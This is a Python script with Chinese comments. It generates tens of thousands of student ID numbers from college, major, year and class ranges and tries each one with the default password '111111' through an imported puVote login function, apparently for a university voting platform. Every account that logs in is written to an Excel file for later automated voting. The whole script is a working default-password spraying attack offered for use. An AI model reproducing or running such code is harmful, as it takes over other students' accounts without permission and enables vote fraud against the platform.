from autoVote_PU import puVote
import xlwt
#设置默认密码，针对用户不修改默认密码的情况--暂时未实现
default_password='111111'
#参数设置
#投票账户
name=''
password=default_password
#文件后缀
addition='Students'
#可登陆账号excel
filename_login='okUsers'+addition+'.xls'

#1+学院+专业+13级+班级+班级学号
#班级学号+班级*100+年级*1000+专业*100000+学院*10000000+1000000000

#1030613202
#1-03-06-13-2-02

#学校中的学院数
college_begin=2
college_end=18
#年纪的开始和结束
age_begin=11
age_end=15
#每学院专业数
special_begin=1
special_end=10
#每专业班级数
class_begin=1
class_end=8
#每班学生号
stduent_begin=1
stduent_end=40




i=0
#写入数据
#新建一个excel文件
file = xlwt.Workbook() #注意这里的Workbook首字母是大写，无语吧
#新建一个sheet
table_write = file.add_sheet('OKUsers')
for college_count in range( college_begin , college_end+1):
    print('学院'+str(college_count))
    for special_count in range( special_begin , special_end+1): 
        print('专业'+str(special_count))
        for age_count in range( age_begin , age_end+1):
            for class_count in range( class_begin , class_end+1):
                for student_count in range( stduent_begin , stduent_end+1):
                    #产生学号
                    num=student_count+class_count*100+age_count*1000+special_count*100000+college_count*10000000+1000000000
                    name=str(num)
                   # print(name)
                    #用于测试账户
                    result=puVote(name,password,0,0)         
                    if(result['login_state']==1):
                        print(str(num)+'第'+str(i)+'个登陆成功')
                        #写入数据
                        #写入数据table.write(行,列,value)
                        table_write.write(i,0,name)
                        table_write.write(i,1,password)
                        table_write.write(i,2,1)
                        i=i+1
        file.save(filename_login)
file.save(filename_login)
print('Finish')


